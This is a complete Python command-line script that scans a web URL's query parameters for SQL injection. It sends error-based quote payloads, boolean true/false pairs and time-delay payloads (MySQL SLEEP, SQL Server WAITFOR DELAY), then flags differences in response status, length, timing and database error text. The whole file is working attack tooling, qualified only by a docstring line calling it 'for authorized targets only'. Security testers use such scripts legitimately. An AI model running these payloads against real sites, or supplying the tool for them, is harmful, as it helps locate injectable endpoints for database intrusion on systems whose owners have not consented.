#!/usr/bin/env python3
"""
sqli_recon.py
Basic SQL injection recon helper for authorized targets only.

Usage:
    python3 sqli_recon.py "http://target.local/item.php?id=1"
    python3 sqli_recon.py "http://target.local/search.php?q=test" --timeout 8

What it does:
- Sends baseline request
- Tests error-based payloads
- Tests boolean-based payloads
- Tests time-based payloads
- Compares status code, content length, and response time
"""

import argparse
import time
import statistics
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

import requests

requests.packages.urllib3.disable_warnings()

SQL_ERRORS = [
    "sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysqli_fetch",
    "supplied argument is not a valid mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "postgresql",
    "psql:",
    "sqlite error",
    "sqlite3.operationalerror",
    "ora-",
    "odbc sql server driver",
    "microsoft ole db provider for sql server",
    "incorrect syntax near",
    "sqlstate",
    "native client",
]

ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\" )",
]

BOOLEAN_TESTS = [
    (" AND 1=1-- -", " AND 1=2-- -"),
    ("' AND '1'='1-- -", "' AND '1'='2-- -"),
    (" OR 1=1-- -", " OR 1=2-- -"),
]

TIME_TESTS = [
    (" AND SLEEP(5)-- -", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (SQLi-Recon-Lab-Script)",
}


def replace_params(url, updates):
    parts = urlsplit(url)
    params = dict(parse_qsl(parts.query, keep_blank_values=True))
    params.update(updates)
    new_query = urlencode(params, doseq=True)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def get_params(url):
    return dict(parse_qsl(urlsplit(url).query, keep_blank_values=True))


def fetch(session, url, timeout):
    start = time.time()
    try:
        r = session.get(url, headers=HEADERS, timeout=timeout, verify=False, allow_redirects=True)
        elapsed = time.time() - start
        return {
            "ok": True,
            "status": r.status_code,
            "len": len(r.text),
            "time": elapsed,
            "text": r.text.lower(),
            "url": r.url,
        }
    except requests.RequestException as e:
        elapsed = time.time() - start
        return {
            "ok": False,
            "status": None,
            "len": 0,
            "time": elapsed,
            "text": str(e).lower(),
            "url": url,
        }


def contains_sql_error(text):
    return any(err in text for err in SQL_ERRORS)


def diff_score(a, b):
    score = 0
    if a["status"] != b["status"]:
        score += 1
    if abs(a["len"] - b["len"]) > 20:
        score += 1
    if abs(a["time"] - b["time"]) > 2:
        score += 1
    return score


def test_param(session, base_url, param, timeout):
    original_params = get_params(base_url)
    original_value = original_params[param]

    print(f"\n[+] Testing parameter: {param}={original_value}")

    baseline = fetch(session, base_url, timeout)
    if not baseline["ok"]:
        print(f"  [-] Baseline request failed: {baseline['text']}")
        return

    print(f"  [*] Baseline -> status={baseline['status']} len={baseline['len']} time={baseline['time']:.2f}s")

    findings = []

    # Error-based tests
    for payload in ERROR_PAYLOADS:
        test_url = replace_params(base_url, {param: original_value + payload})
        resp = fetch(session, test_url, timeout)
        if contains_sql_error(resp["text"]):
            findings.append(("error-based", payload, f"SQL error text detected"))
            print(f"  [!] Error-based indicator with payload: {payload!r}")

    # Boolean-based tests
    for true_payload, false_payload in BOOLEAN_TESTS:
        true_url = replace_params(base_url, {param: original_value + true_payload})
        false_url = replace_params(base_url, {param: original_value + false_payload})

        true_resp = fetch(session, true_url, timeout)
        false_resp = fetch(session, false_url, timeout)

        ds = diff_score(true_resp, false_resp)
        baseline_true = diff_score(baseline, true_resp)
        baseline_false = diff_score(baseline, false_resp)

        if ds >= 1 and baseline_true != baseline_false:
            findings.append(("boolean-based", f"{true_payload} / {false_payload}", "True/false response difference"))
            print(f"  [!] Boolean-based difference detected")
            print(f"      TRUE  -> status={true_resp['status']} len={true_resp['len']} time={true_resp['time']:.2f}s")
            print(f"      FALSE -> status={false_resp['status']} len={false_resp['len']} time={false_resp['time']:.2f}s")

    # Time-based tests
    base_times = []
    for _ in range(3):
        resp = fetch(session, base_url, timeout)
        base_times.append(resp["time"])
    base_avg = statistics.mean(base_times)

    for payload, expected_delay in TIME_TESTS:
        test_url = replace_params(base_url, {param: original_value + payload})
        resp = fetch(session, test_url, timeout + expected_delay + 2)

        if resp["time"] > base_avg + expected_delay - 1:
            findings.append(("time-based", payload, f"Response delayed ({resp['time']:.2f}s)"))
            print(f"  [!] Time-based indicator with payload: {payload!r}")
            print(f"      Baseline avg={base_avg:.2f}s delayed={resp['time']:.2f}s")

    if not findings:
        print("  [-] No obvious SQLi indicators found")
    else:
        print("  [=] Summary:")
        for kind, payload, note in findings:
            print(f"      - {kind}: {note} | payload={payload!r}")


def main():
    parser = argparse.ArgumentParser(description="Basic SQLi recon script for authorized testing")
    parser.add_argument("url", help="Full URL with parameters, e.g. http://target/item.php?id=1")
    parser.add_argument("--timeout", type=int, default=6, help="Request timeout in seconds")
    args = parser.parse_args()

    params = get_params(args.url)
    if not params:
        print("[-] URL has no query parameters to test")
        return

    session = requests.Session()

    print("[*] Starting SQLi recon")
    print(f"[*] Target: {args.url}")

    for param in params:
        test_param(session, args.url, param, args.timeout)


if __name__ == "__main__":
    main()
